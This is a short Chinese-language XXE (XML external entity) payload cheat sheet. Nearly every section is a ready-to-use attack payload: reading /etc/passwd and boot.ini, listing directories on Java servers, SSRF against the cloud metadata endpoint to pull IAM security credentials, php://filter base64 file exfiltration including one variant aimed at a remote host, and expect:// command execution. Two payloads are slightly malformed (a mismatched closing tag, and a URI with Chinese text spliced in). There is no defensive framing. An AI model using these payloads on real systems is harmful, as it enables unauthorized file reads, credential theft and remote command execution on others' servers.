# XXE漏洞

检测漏洞

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

当 XML 解析器解析外部实体时，结果应在 firstName 中包含John，在 lastName 中包含Doe

## 读取文件

1.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck3>
```

2.
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

3.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

4.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

SYSTEM 和 PUBLIC 可以互换，例如：
```xml
<!ENTITY % xxe PUBLIC "Random Text" "URL">
<!ENTITY xxe PUBLIC "Any TEXT" "URL">
```

在基于Java的应用程序中，可以通过 XXE列出目录的内容，其有效负载如下:
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```

## 执行SSRF攻击

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM
 "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```

## PHP包装器

### php://filter

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [<!ENTITY xxe SYSTEM
"php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [<!ENTITY xxe SYSTEM
"php://filter为php://filter/convert.base64-encode/resource=http://远程主机地址">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### expect://

```XML
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY cmd SYSTEM "expect://id">
]>
<root>&cmd;</root>
```
